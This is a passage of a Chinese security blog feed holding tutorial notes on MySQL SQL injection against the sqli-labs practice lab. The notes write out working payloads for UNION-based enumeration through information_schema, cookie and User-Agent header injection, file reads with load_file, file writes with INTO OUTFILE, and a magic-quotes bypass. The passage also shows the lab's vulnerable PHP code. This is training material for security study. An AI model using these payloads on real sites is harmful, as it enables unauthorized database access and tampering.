src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909164139.png" alt="image.png"></li><li>源代码，其中加入<code>echo $sql;</code>回显sql执行命令<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909164502.png" alt="image.png"></li></ul><h2 id="使用hackbar模拟post数据提交测试"><a href="#使用hackbar模拟post数据提交测试" class="headerlink" title="使用hackbar模拟post数据提交测试"></a>使用hackbar模拟post数据提交测试</h2><ul><li>hackbar安装地址：<a href="https://github.com/HCTYMFF/hackbar2.1.3">https://github.com/HCTYMFF/hackbar2.1.3</a></li></ul><h3 id="使用hackbar进行登录测试"><a href="#使用hackbar进行登录测试" class="headerlink" title="使用hackbar进行登录测试"></a>使用hackbar进行登录测试</h3><ul><li>一般的登录情况都是采用的post提交数据、通过抓包获取到登录信息将它放在hackbar中进行登录测试，也是为了验证hackbar是否能正常使用，要是确认hackbar能正常使用这个可以跳过。</li><li>进行登录，然后使用burp抓包获取登录信息<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910150620.png" alt="image.png"></li><li>获取到的登录信息<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=Dumb&amp;passwd=Dumb&amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li>在hackbar当中进行测试，输入post data<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910150805.png" alt="image.png"></li><li>登录成功</li></ul><h3 id="枚举数据库字段"><a href="#枚举数据库字段" class="headerlink" title="枚举数据库字段"></a>枚举数据库字段</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910151021.png" alt="image.png"></p><ul><li>post data以下内容<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=admin<span class="string">&#x27; order by 3#&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure></li><li>在mysql当中一般注释后面的字句是采用<code>--+</code>，在有些字句中采用<code>#</code>注释。</li><li>需要多测试才能发现，为了验证<code>#</code>是注释符号，将<code>#</code>替换为<code>--+</code>执行，查看结果看到报错信息<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910151418.png" alt="image.png"></li><li>在数据库当中执行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910151642.png" alt="image.png"></li><li>可以得出结论，最终验证<code>#</code>是注释了后面的字句</li><li>将order by 3改成2查看</li><li><code>uname=admin&#39; order by 2#&amp;passwd=admin&amp;submit=Submit</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910151753.png" alt="image.png"></li><li>可以看到登录成功，但实际上登录的用户名密码是错误的，因为只将sql语句注入进去没有报错，下面的语句正常的执行就显示登录成功</li><li>换句话说就是登录到情况只有两个字段，很可能就是用户名密码。</li></ul><h3 id="枚举出数据库的名称"><a href="#枚举出数据库的名称" class="headerlink" title="枚举出数据库的名称"></a>枚举出数据库的名称</h3><ul><li><code>uname=admin&#39; and 1=2 union select database(),2 #&amp;passwd=admin&amp;submit=Submit</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910152437.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910152528.png" alt="image.png"></li></ul><h1 id="参数JSON数据注入测试"><a href="#参数JSON数据注入测试" class="headerlink" title="参数JSON数据注入测试"></a>参数JSON数据注入测试</h1><ul><li>本地环境代码演示</li><li>json格式<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910154035.png" alt="image.png"></li><li>json注入<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910154057.png" alt="image.png"></li><li>注入方式：如果是数字的，可以不加<code>&#39;</code>闭合，如果是字符的话，加上<code>&quot;</code>闭合</li></ul><h1 id="COOKIE数据提交注入测试"><a href="#COOKIE数据提交注入测试" class="headerlink" title="COOKIE数据提交注入测试"></a>COOKIE数据提交注入测试</h1><ul><li>sqli-labs less-20</li></ul><h2 id="网站传递参数的方式"><a href="#网站传递参数的方式" class="headerlink" title="网站传递参数的方式"></a>网站传递参数的方式</h2><table><thead><tr><th>参数类型</th><th>含义</th></tr></thead><tbody><tr><td>get型</td><td>一般访问网站的行为</td></tr><tr><td>cookie型</td><td>伴随着访问网页的行为</td></tr><tr><td>post型</td><td>上传文件，登录</td></tr></tbody></table><ul><li><strong>cookie注入原理</strong>：对get传递来的参数进行了过滤，但是忽略了cookie也可以传递参数。</li><li>cookie注入的原理在于更改本地的cookie，从而利用cookie来提交非法语句。</li><li>条件一：程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤</li><li>条件二： 条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取，也就是说用request这个方法的时候获取的参数可以是是在URL后面的参数也可以是cookie里面的参数这里没有做筛选，之后的原理就像我们的sql注入一样了。</li><li>通过burp抓包分析<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910160215.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910160224.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910160232.png" alt="image.png"></li><li>这里在数据包当中发现了一个带cookie的参数<code>Cookie: uname=Dumb</code></li><li>将这个数据包发送到repeater（重发器）当中</li><li>并修改cookie参数<code>Cookie: uname=Dumb&#39; and 1=2 union select database(),2,3 #</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910161119.png" alt="image.png"></li><li>写改为<code>Cookie: uname=Dumb&#39; and 1=2 union select user(),2,3 #</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910161256.png" alt="image.png"></li></ul><h1 id="HTTP头部参数数据注入测试"><a href="#HTTP头部参数数据注入测试" class="headerlink" title="HTTP头部参数数据注入测试"></a>HTTP头部参数数据注入测试</h1><ul><li>sqli-labs less-18</li><li>查看数据库源代码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row1</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>);</span><br><span class="line"><span class="comment">//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your User Agent is: &#x27;</span> .<span class="variable">$uagent</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>根据源代码可以看出，对执行的insert语句没有任何的限制，也就是说我们通过修改http的头部信息可以达到sql注入的效果</li><li>为方便实验，在103行加入sql语句的显示界面<code>echo $insert;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910162059.png" alt="image.png"></li><li>修改数据包注入，获取数据库名称</li><li><code>User-Agent: &#39;and extractvalue (1,concat(0x7e,(select database()),0x7e)) and&#39;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910162314.png" alt="image.png"></li><li>获取用户名<code>User-Agent: &#39;and extractvalue (1,concat(0x7e,(select user()),0x7e)) and&#39; Firefox/116.0</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910162449.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MYSQL注入 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day13 WEB漏洞SQL注入之MYSQL注入</title>
      <link href="/2023/09/08/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day13%20WEB%E6%BC%8F%E6%B4%9ESQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/09/08/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day13%20WEB%E6%BC%8F%E6%B4%9ESQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907131330.png" alt="image.png"></p><h1 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h1><ul><li>information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。</li><li>information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。</li></ul><h2 id="SCHEMATA表"><a href="#SCHEMATA表" class="headerlink" title="SCHEMATA表"></a>SCHEMATA表</h2><ul><li>当前MySQL实例中所有数据库的信息</li><li><code>SHOW DATABASES;</code>命令用来从这个表获取数据<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907200630.png" alt="image.png"></li></ul><h2 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h2><ul><li><code>select SCHEMA_NAME,DEFAULT_CHARACTER_SET_NAME from SCHEMATA;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907200841.png" alt="image.png"></li></ul><h2 id="TABLES表"><a href="#TABLES表" class="headerlink" title="TABLES表"></a>TABLES表</h2><ul><li>存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。</li><li><code>SHOW TABLES FROM XX;</code> 命令从这个表获取结果。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907201507.png"></li></ul><h2 id="COLUMNS表"><a href="#COLUMNS表" class="headerlink" title="COLUMNS表"></a>COLUMNS表</h2><ul><li>存储表中的列信息，包括表有多少列、每个列的类型等。<code>SHOW COLUMNS FROM schemaname.tablename</code> 命令从这个表获取结果。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907220526.png" alt="image.png"></li></ul><h2 id="USER-PRIVILEGES表"><a href="#USER-PRIVILEGES表" class="headerlink" title="USER_PRIVILEGES表"></a>USER_PRIVILEGES表</h2><ul><li>用户权限表。内容源自 mysql.user 授权表。是非标准表。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907220730.png" alt="image.png"></li></ul><h1 id="跨库攻击"><a href="#跨库攻击" class="headerlink" title="跨库攻击"></a>跨库攻击</h1><ul><li>前提准备<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database book;</span><br><span class="line">mysql&gt; use book;</span><br><span class="line">mysql&gt; CREATE TABLE IF NOT EXISTS book(    `book_id` INT UNSIGNED AUTO_INCREMENT,    `book_title` VARCHAR(100) NOT NULL,    `book_author` VARCHAR(40) NOT NULL,    `submission_date` DATE,    PRIMARY KEY ( `book_id` ) )ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| book               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">mysql&gt; use book;</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+----------------+</span><br><span class="line">| Tables_in_book |</span><br><span class="line">+----------------+</span><br><span class="line">| book           |</span><br><span class="line">+----------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; desc book;</span><br><span class="line">+-----------------+------------------+------+-----+---------+----------------+</span><br><span class="line">| Field           | Type             | Null | Key | Default | Extra          |</span><br><span class="line">+-----------------+------------------+------+-----+---------+----------------+</span><br><span class="line">| book_id         | int(10) unsigned | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| book_title      | varchar(100)     | NO   |     | NULL    |                |</span><br><span class="line">| book_author     | varchar(40)      | NO   |     | NULL    |                |</span><br><span class="line">| submission_date | <span class="built_in">date</span>             | YES  |     | NULL    |                |</span><br><span class="line">+-----------------+------------------+------+-----+---------+----------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure></li><li>打开网页进行查询当前数据库的用户</li><li><code>?id=-1%20union%20select%201,user(),3</code></li><li>可以看见当前用户为root，拥有最高权限<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907222102.png" alt="image.png"></li><li>获取到当前网页的数据库名</li><li><code>?id=-1%20union%20select%201,database(),3</code>3</li><li>获取到当前数据库名为security<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908154319.png" alt="image.png"></li><li>常见的数据库与用户的对应关系</li><li>这样的好处一个用户对应一个数据库，网站之间的数据不会互相干扰，这是最基础的数据库模型，现在大网站都是分布式数据库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数据库A=网站A=数据库用户A——&gt;表名——&gt;列名——&gt;数据</span><br><span class="line">数据库B=网站B=数据库用户B——&gt;表名——&gt;列名——&gt;数据</span><br><span class="line">数据库C=网站C=数据库用户C——&gt;表名——&gt;列名——&gt;数据</span><br></pre></td></tr></table></figure></li><li>在数据库中查询有哪些用户<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; <span class="keyword">select</span> host,user,authentication_string from user;</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908155809.png" alt="image.png"></li><li>在源码查看使用的是哪一个用户</li><li>一般网站安装时都会指定数据库二点用户名和密码</li><li>这里指定root用户，密码为空，指定数据库为security<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">db-creds.inc</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//give your mysql connection username n password</span><br><span class="line"><span class="variable">$dbuser</span> =<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> =<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$dbname</span> =<span class="string">&quot;security&quot;</span>;</span><br><span class="line"><span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$dbname1</span> = <span class="string">&quot;challenges&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li><li>跨库查询的前提条件是必须<strong>高权限</strong>的用户才能执行跨库查询。</li><li><code>?id=-1%20union%20select%201,schema_name,3%20from%20information_schema.schemata</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908160951.png" alt="image.png"></li><li>相当于数据库执行<code>select * from users where id=-1 union select 1,schema_name,3 from information_schema.schemata limit 0,1;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908164510.png" alt="image.png"></li></ul><h2 id="获取到所有的数据库名称"><a href="#获取到所有的数据库名称" class="headerlink" title="获取到所有的数据库名称"></a>获取到所有的数据库名称</h2><ul><li><code>union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata</code></li><li><code>group_concat()</code>将分组中的字符串与各种选项进行连接<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908164653.png" alt="image.png"></li><li>相当于数据库执行&#96;select * from users where id&#x3D;-1 union select 1,group_concat(schema_name),3 from information_schema.schemata;<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908165412.png" alt="image.png"></li></ul><h2 id="指定获取book库中的表名信息"><a href="#指定获取book库中的表名信息" class="headerlink" title="指定获取book库中的表名信息"></a>指定获取book库中的表名信息</h2><ul><li><code>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;book&#39;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908165653.png" alt="image.png"></li><li>相当于数据库执行命令<code>select * from users where id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;book&#39;;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908170204.png" alt="image.png"></li></ul><h2 id="获取指定数据库book下的book表的列名信息"><a href="#获取指定数据库book下的book表的列名信息" class="headerlink" title="获取指定数据库book下的book表的列名信息"></a>获取指定数据库book下的book表的列名信息</h2><ul><li><code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;book&#39; and table_schema=&#39;book&#39;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908170625.png" alt="image.png"></li><li>相当于数据库命令<code>select * from users where id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;book&#39; and table_schema=&#39;book&#39;;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908170859.png" alt="image.png"></li></ul><h2 id="查询到指定数据"><a href="#查询到指定数据" class="headerlink" title="查询到指定数据"></a>查询到指定数据</h2><ul><li>union  select book_id,book_title,book_author from book.book<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908172628.png" alt="image.png"></li><li>数据库命令<code>select * from users where id=-1 union select book_id,book_title,book_author from book.book;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908172716.png" alt="image.png"></li></ul><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><ul><li>username和password字段是users表中的字段，又因为查询到的数据为空，执行后面的联合字句的时候将内容填充到下面，所以获取到的内容并不是十分准确，另外要内容十分准确必须要满足book表和user表的结构完全相同</li></ul><h1 id="文件读写函数"><a href="#文件读写函数" class="headerlink" title="文件读写函数"></a>文件读写函数</h1><ul><li><code>load_file</code>文件读取</li><li><code>into outfile</code>或<code>into dumpfile</code>文件</li><li>获取路径的常见方法：报错显示、遗漏文件、漏洞报错、平台配置文件、爆破等</li><li>报错显示：当网站出现错误的时候，在报错显示当中可能就会包含文件的路径</li><li>遗漏文件：在网站建立的时候会有<code>phpinfo.php</code>文件，通常用于建立网站时使用，当中会包含文件路径</li><li>漏洞报错：通过网站漏洞，爆路径的方式</li><li>平台配置文件：通过读取文件来读取网站的配置文件，通常是默认的路径，如果改了那就很难找到</li><li>爆破：通常是没办法的时候，通过一个一个试的方式</li><li>通过工具扫描通常就能发现很多错误，通常就会包括路径</li></ul><h2 id="查询是否有写入的权限"><a href="#查询是否有写入的权限" class="headerlink" title="查询是否有写入的权限"></a>查询是否有写入的权限</h2><ul><li><code>show global variables like &#39;%secure_file_priv%&#39;;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908220011.png" alt="image.png"></li><li>NULL：不允许导入或导出</li><li>&#x2F;tmp：只允许在 &#x2F;tmp 目录导入导出</li><li>空：不限制目录</li><li>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</li><li>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</li></ul><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><ul><li>在网页源代码中可以看到被读取的文件内容</li><li>这里读取了数据库的配置信息<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908222348.png" alt="image.png"></li><li>数据库命令的内容<code>select load_file();</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908222558.png" alt="image.png"></li><li>读取敏感信息：<a href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a></li></ul><h2 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h2><ul><li><code>?id=-1%20union%20select%201,%27zys%27,3%20into%20outfile%20%27D:/zys.txt%27--+</code></li><li>最后面的<code>--+</code>用于注释掉后面的内容<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908223157.png" alt="image.png"></li><li>数据库命令<code>select &#39;zys&#39; into outfile &#39;D:/zys.txt&#39;;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908223449.png" alt="image.png"></li><li>D盘当中就生成了这个文件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908223505.png" alt="image.png"></li></ul><h1 id="魔法引号开关"><a href="#魔法引号开关" class="headerlink" title="魔法引号开关"></a>魔法引号开关</h1><ul><li>魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时，<strong>对单引号、双引号、反斜线、NULL</strong>加上<strong>一个一个反斜线进行转义</strong>，这个的作用跟addslashes()的作用完全相同。</li><li>正确地接收和读取数据，从而正确地执行SQL语句，防止恶意的SQL注入。</li></ul><h2 id="取消原因："><a href="#取消原因：" class="headerlink" title="取消原因："></a>取消原因：</h2><ul><li>在PHP5.4.0版本之后就取消了，原因</li><li>（1）可移植性:</li><li>编程时认为其打开或并闭都会影响到移植性。可以用 get_magic_quotes_gpc() 来检查是否打开，并据此编程。</li><li>（2）性能：</li><li>由于并不是每一段被转义的数据都要插入数据库的，如果所有进入 PHP 的数据都被转义的话，那么会对程序的执行效率产生一定的影响。在运行时调用转义函数（如 addslashes()）更有效率。 尽管 php.ini-dist 默认打开了这个选项，但是 php.ini-recommended 默认却关闭了它，主要是出于性能的考虑。</li><li>（3）方便：</li><li>由于不是所有数据都需要转义，在不需要转义的地方看到转义的数据就很烦。比如说通过表单发送邮件，结果看到一大堆的 ‘。针对这个问题，可以使用 stripslashes() 函数处理。</li></ul><h2 id="开关"><a href="#开关" class="headerlink" title="开关"></a>开关</h2><ul><li>在php的配置文件<code>php.ini</code>当中，<code>magic_quotes_gpc</code>为魔法引号的开关<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908225943.png" alt="image.png"></li></ul><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><ul><li>采用hex(16进制)编码绕过</li><li>因为对路径进行编码之后，不再需要单引号了，魔术引号不会再对其生效，也就是说绕过了魔术引号的作用达到绕过。</li><li>编码软件:winhex</li></ul><h1 id="int函数"><a href="#int函数" class="headerlink" title="int函数"></a>int函数</h1><ul><li>判断输入的是否为数字</li><li>判断数字基本上没办法绕过，因为没办法在纯数字当中注入内容<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_int</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ni shi ge jj?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/sqlzhuruint.png" alt="sqlzhuruint.png"></li><li>防护软件一般也是对关键字进行防护、触发了waf等安全软件规则会将数据包丢弃。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MYSQL注入 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-labs安装教程</title>
      <link href="/2023/09/07/Sqli-labs%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
      <url>/2023/09/07/Sqli-labs%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
      
